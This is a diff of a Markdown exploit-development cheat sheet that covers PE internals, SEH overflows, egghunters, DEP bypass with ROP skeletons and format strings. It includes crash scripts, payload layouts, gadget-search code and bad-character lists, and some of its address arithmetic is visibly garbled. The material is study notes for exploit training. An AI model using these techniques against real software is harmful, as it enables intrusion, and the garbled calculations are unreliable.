@@ -10,6 +10,7 @@ categories:
 toc: true
 ---
 # x86 Intel Assembly
+
 | Register Name | Acronym | 16-bit | 8-bit High | 8-bit Low | Description |
 | --- | --- | --- | --- | --- | --- |
 | Extended Accumulator Register | EAX | AX  | AH  | AL  | Primarily used for arithmetic operations. Often stores the return value of a function. |
@@ -256,7 +257,7 @@ typedef struct _IMAGE_OPTIONAL_HEADER { ... DWORD AddressOfEntryPoint; DWORD Bas
 
 **Example Calculations:**
 
-- If `ImageBase` is `0x400000` and `AddressOfEntryPoint` is `0x1000`, the VA of the entry point is 0x400000+0x1000=0x4010000x400000+0x1000=0x401000.
+- If `ImageBase` is `0x400000` and `AddressOfEntryPoint` is `0x1000`, the VA of the entry point is `0x400000+0x1000=0x4010000x400000+0x1000=0x401000`.
 - If `SectionAlignment` is `0x1000`, sections start at memory addresses that are multiples of `0x1000`.
 - If `SizeOfImage` is `0x16000`, the image takes up `0x16000` bytes in memory.
 
@@ -276,7 +277,7 @@ typedef struct _IMAGE_OPTIONAL_HEADER { ... DWORD NumberOfRvaAndSizes; IMAGE_DAT
 
 - For `SectionAlignment` 0x10000x1000, the .text section RVA 0x10000x1000 implies a VA of 0x400000+0x1000=0x4010000x400000+0x1000=0x401000.
 - For `FileAlignment` 0x2000x200, the file offset of the .text section 0x4000x400 aligns with this value since 0x4000x400 is a multiple of 0x2000x200.
-- The difference between file offset and RVA for the entry point is due to these alignments. If the file offset for the entry point is 0x66A0x66A and the .text section offset is 0x4000x400, the RVA offset is 0x66A−0x400=0x26A0x66A−0x400=0x26A.
+- The difference between file offset and RVA for the entry point is due to these alignments. If the file offset for the entry point is 0x66A0x66A and the .text section offset is 0x4000x400, the RVA offset is `0x66A−0x400=0x26A0x66A−0x400=0x26A`.
 
 ## Section Headers & Sections
 
@@ -333,7 +334,7 @@ IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
     
 - Calculate the Virtual Address by adding the RVA to the Image Base (`0x400000` in the example):
     
-    0x400000+0x1000=0x4010000x400000+0x1000=0x401000
+    `0x400000+0x1000=0x4010000x400000+0x1000=0x401000`
     
 - `PointerToRawData` (e.g., `0x400` for `.text` section) is the file offset for the beginning of the section on disk.
     
@@ -445,7 +446,7 @@ Imported symbols can be referenced in two primary ways:
     
 2.  The Virtual Address of the `.text` section is calculated by adding its RVA to the base address:
     
-    Base Address+RVA of ‘.text‘=0x400000+0x1000=0x401000Base Address+RVA of ‘.text‘=0x400000+0x1000=0x401000
+    Base Address+RVA of ‘.text‘=`0x400000+0x1000=0x401000Base Address+RVA` of ‘.text‘=`0x400000+0x1000=0x401000`
 	
 	
 ## Inspect PE using WinDBG
@@ -479,7 +480,9 @@ Imported symbols can be referenced in two primary ways:
 
 
 ## Useful Tables
+
 ### Table 1
+
 | Structure             | Field Name                        | Description                                               | Name in PE-Bear                | How to Find in WinDbg                            | Manual Calculation                                       | Example      |
 |-----------------------|-----------------------------------|-----------------------------------------------------------|--------------------------------|--------------------------------------------------|----------------------------------------------------------|--------------|
 | DOS Header            | e_magic                           | DOS signature                                             | e_magic                        | `dt _IMAGE_DOS_HEADER <address>`                 | `<address> + 0x00`                                       | `5A4D`       |
@@ -498,6 +501,7 @@ Imported symbols can be referenced in two primary ways:
 | Section Header        | PointerToRawData                  | The file pointer to the section's raw data                | PointerToRawData               | `dt _IMAGE_SECTION_HEADER <address>`             | `<Section Table addr> + index * Section size + 0x14`      | `400`        |
 | Section Header        | Characteristics                   | Characteristics of the section                            | Characteristics                | `dt _IMAGE_SECTION_HEADER <address>`             | `<Section Table addr> + index * Section size + 0x24`      | `60000020`   |
 ---
+
 ### Table 2
 
 | Field Name                 | Description                                        | Name in PE-Bear       | How to Find in WinDbg              | Manual Calculation                           | Example                 |
@@ -515,6 +519,7 @@ Imported symbols can be referenced in two primary ways:
 | SectionHeader.PointerToRawData | The file pointer to the section's raw data   | PointerToRawData      | `dt _IMAGE_SECTION_HEADER <addr>`  | `<Section Table addr> + index * Section size`| `400`                   |
 
 ---
+
 ### Table 3
 
 | Field Name                | Description                                               | Name in PE-bear                | How to Find in WinDbg              | Manual Calculation to Find It                 | Example           |
@@ -1066,17 +1071,20 @@ if __name__ == "__main__":
 ```
 
 ## Find Offset
+
 For finding the offset where the `EIP` get overwrited.
 - Create Unique pattern:
 ```
 msf-pattern_create -l size
 ```
 - Find the offset match of the pattern
+
 ```
 msf-pattern_offset -l size -q value
 ```
 
 ## Detect BadChars
+
 ```
 badchars = (
 b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -1134,9 +1142,15 @@ msf-metasm_shell
 We use `sp` to avoid null bytes
 
 # SEH Overflows
+
 ## Crashing The App
+
+```
 You send a request with huge data input and review the app if crash or no, Sometimes the App may not crash if you didn't send the data at once.
+```
+
 ## Network Script
+
 ```
 #!/usr/bin/python
 import socket, os, time, struct
@@ -1151,7 +1165,9 @@ s.send(buffer)
 s.close()
 
 ```
+
 ## Web Script
+
 ```
 #!/usr/bin/python
 import socket, sys
@@ -1191,6 +1207,7 @@ if __name__ == "__main__":
 ```
 
 ## Find Offset
+
 For finding the offset where the `EIP` get overwrited.
 - Create Unique pattern:
 ```
@@ -1210,10 +1227,15 @@ nseh = the jmp short bytes
 seh = pop r32; pop r32; ret;
 ```
 ### Get SEH value with `Windbg`
+
 ![105645eaf2c06a99f4c3671a6af8c26a.png](:/c16df9c3c82b480c92ae1293450d282f)
+
 ### Never forget to add the final padding
+
 ![38f35a6de44b69f7251cc414ade720c1.png](:/294189abd7bd48ff84eaba893d5a225f)
-## 3- Detect BadChars
+
+## Detect BadChars
+
 ```
 badchars = (
 b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -1227,8 +1249,11 @@ b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\x
 ```
 
 ## P/ P/ R/
+
 Next step is to find the `pop r32; pop r32; ret;`:
+
 ### Windbg code:
+
 ```c
 .block
 {
@@ -1241,7 +1266,9 @@ Next step is to find the `pop r32; pop r32; ret;`:
 	}
 }
 ```
+
 ### Pykd:
+
 ```python
 from pykd import *
 import sys
@@ -1280,6 +1307,7 @@ print("\n[+] Searching for /P /P /R done ")
 ```
 
 ## `JMP` short bytes
+
 Now, It's time to `JMP` shortly to avoid invalid instructions and crash.
 - First when `P/ P/ R/` instructions is done, You start to assemble the address using windbg:
 ![1efd3ff87af74e9556ec17a0f41df0dc.png](:/4603c18772584baabba4703ca5e03a71)
@@ -1290,6 +1318,7 @@ Now, It's time to `JMP` shortly to avoid invalid instructions and crash.
 	- Finally don't forget to add 2 `\x90` as the address is missing 2 bytes(`\xeb\x08\x90\x90`).
 
 ## Island Hopping
+
 In island hopping we calcluate the length if bytes between the `esp` and start of our shellcode, That way when we get the value we can add it to `esp/sp` and elemenat it and `JMP` to the `esp` which will be indicating to our shellcode.
 - steps:
 ```
@@ -1304,7 +1333,9 @@ msf-metasm_shell
 We use `sp` to avoid null bytes
 
 ## Executing shellcode
+
 The structure of our payload would be the following
+
 ```python 
 filler = b"\x41" * (size)
 nseh = b"\xeb\x08\x90\x90"
@@ -1317,6 +1348,7 @@ buffer = padding + nseh + seh + shellcode + padding2
 
 ```
 ## Tips
+
 - If you have a small buffer space you can do the following
 	- Find a register that indicates to the start of your shellcode and do use `call reg` instruction or `JMP reg`.
 	- Also you could use `JMP` backward or negative `JMP`
@@ -1328,13 +1360,18 @@ buffer = padding + nseh + seh + shellcode + padding2
 	- The the address of the instruction or the module contains null-byte, then do partcial overwrite for example if the address of the instruction as the following `00414E7A`, then set the `EIP` as `414E7A`.
 
 # Egghunters
+
 ## Egghunting
+
 Manually send a dummy shellcode with an egg(dword):
+
 ```
 dummmy = b"w00tw00t"
 duy += b"\x41"*400
 ```
+
 then search for it all over the memory space using `Windbg` command:
+
 ```
 s -a 0 L?80000000 "w00tw00t"
 ```
@@ -1417,6 +1454,7 @@ CODE = (
 ```
 
 ## Scripts
+
 Finally You can use the following code to generate your own egg hunter:
 ```
 import sys
@@ -1706,6 +1744,7 @@ There are many ways to bypass `DEP` as the following:
 ## Functions Requirements
 
 ### VirtualAlloc()
+
 ```C
 LPVOID WINAPI VirtualAlloc(
   __in_opt  LPVOID lpAddress,
@@ -1724,12 +1763,14 @@ LPVOID WINAPI VirtualAlloc(
 | **flProtect**       | Set to `0x40` (EXECUTE_READWRITE). Similar to `flAllocationType`, this value might need to be placed on the stack using a ROP gadget.                                                           |
 
 ### HeapCreate()
+
 ```C
 HANDLE WINAPI HeapCreate(
   __in  DWORD flOptions,
   __in  SIZE_T dwInitialSize,
   __in  SIZE_T dwMaximumSize
 );
+
 ```
 
 | Parameter        | Description                                                                                                                                           |
@@ -1739,6 +1780,7 @@ HANDLE WINAPI HeapCreate(
 | **dwMaximumSize**| The maximum size of the heap. This can be set to zero to allow the heap to grow as needed.                                                            |
 
 ### SetProcessDEPPolicy()
+
 ```C
 BOOL WINAPI SetProcessDEPPolicy(
   __in  DWORD dwFlags
@@ -1750,6 +1792,7 @@ BOOL WINAPI SetProcessDEPPolicy(
 | **dwFlags** | Flags to set the DEP policy. Set to `0` to disable DEP for the process. Only effective when the system DEP policy is OptIn or OptOut.      |
 
 ### NtSetInformationProcess()
+
 ```C
 NTSTATUS WINAPI NtSetInformationProcess(
   __in  HANDLE ProcessHandle,
@@ -1767,6 +1810,7 @@ NTSTATUS WINAPI NtSetInformationProcess(
 | **ProcessInformationLength**   | Size of the buffer pointed to by `ProcessInformation`. For DEP settings, this will be `sizeof(DWORD)`.                                                         |
 
 ### VirtualProtect()
+
 ```C
 BOOL WINAPI VirtualProtect(
   __in   LPVOID lpAddress,
@@ -1784,6 +1828,7 @@ BOOL WINAPI VirtualProtect(
 | **lpflOldProtect**| A pointer to a variable that receives the old access protection of the first page in the specified region of pages. Can be `NULL` if this information is not needed.          |
 
 ### WriteProcessMemory()
+
 ```C
 BOOL WINAPI WriteProcessMemory(
   __in   HANDLE hProcess,
@@ -1805,6 +1850,7 @@ BOOL WINAPI WriteProcessMemory(
 ## Functions skeleton
 
 ### VirtualAlloc()
+
 ```python
 va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
 va += pack("<L", (0x46464646)) # Shellcode Return Address
@@ -1815,6 +1861,7 @@ va += pack("<L", (0x51515151)) # dummy flProtect
 ```
 
 ### HeapCreate()
+
 ```python
 from struct import pack
 
@@ -1826,6 +1873,7 @@ hc += pack("<L", 0x59595959) # dummy dwMaximumSize
 ```
 
 ### SetProcessDEPPolicy()
+
 ```python
 spd = pack("<L", 0x5A5A5A5A) # dummy SetProcessDEPPolicy Address
 spd += pack("<L", 0x5B5B5B5B) # Return Address after SetProcessDEPPolicy
@@ -1833,6 +1881,7 @@ spd += pack("<L", 0x5C5C5C5C) # dummy dwFlags
 ```
 
 ### NtSetInformationProcess()
+
 ```python
 nsip = pack("<L", 0x5D5D5D5D) # dummy NtSetInformationProcess Address
 nsip += pack("<L", 0x5E5E5E5E) # Return Address after NtSetInformationProcess
@@ -1843,6 +1892,7 @@ nsip += pack("<L", 0x62626262) # dummy ProcessInformationLength
 ```
 
 ### VirtualProtect()
+
 ```python
 vp = pack("<L", 0x63636363) # dummy VirtualProtect Address
 vp += pack("<L", 0x64646464) # Return Address after VirtualProtect
@@ -1852,6 +1902,7 @@ vp += pack("<L", 0x67676767) # dummy flNewProtect
 vp += pack("<L", 0x68686868) # dummy lpflOldProtect
 ```
 ## Find a dword for `lpflOldProtect`
+
 ```
 #get the .data section info first
 !dh module -a
@@ -1869,6 +1920,7 @@ module+virtual address+virtual size+4
 !address result # you can add more 4 until find the right one for u
 ```
 ### WriteProcessMemory()
+
 ```python
 wpm = pack("<L", 0x69696969) # dummy WriteProcessMemory Address
 wpm += pack("<L", 0x6A6A6A6A) # Return Address after WriteProcessMemory
@@ -1880,6 +1932,7 @@ wpm += pack("<L", 0x6F6F6F6F) # dummy lpNumberOfBytesWritten
 ```
 
 ## Find Code Cave for your shellcode
+
 ```
 #We need to locate the code section first
 dd module+3c l1 
@@ -1903,7 +1956,8 @@ s -[1]b start end 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 !address code_cave
 ```
 
-## Find a dword for `lpNumberOfBytesWritten`:
+## Find a dword for `lpNumberOfBytesWritten`
+
 ```
 #get the .data section info first
 !dh module -a
@@ -1920,7 +1974,9 @@ SECTION HEADER #3
 #Now checxk the result address
 !address result # you can add more 4 until find the right one for u
 ```
+
 ## Find ROP Gadgets
+
 ```
 #rp++
 rp++.exe -f binary -r length > output.txt
@@ -2057,6 +2113,7 @@ base_address = 16089DEA - 89DEA
 
 # Format Strings Vulnerabilities
 ## Reading Permitive
+
 | Specifier | Description                            | Potential Use in Vulnerability |
 |-----------|----------------------------------------|--------------------------------|
 | `%s`      | String                                 | Can read arbitrary memory      |
@@ -2071,7 +2128,9 @@ base_address = 16089DEA - 89DEA
 | `%e`, `%E`| Scientific notation (floating-point)   | Can leak float values          |
 | `%g`, `%G`| Shortest of `%e`/`%f` or `%E`/`%f`     | Can leak float values          |
 | `%a`, `%A`| Hexadecimal floating-point             | Can leak float values          |
+
 ## Writing Permitive
+
 | Specifier | Description                                      | Typical Use                                  |
 |-----------|--------------------------------------------------|----------------------------------------------|
 | `%n`      | Writes the number of characters printed so far into the provided integer pointer. | Used in format string exploits to write values to specific memory addresses. |
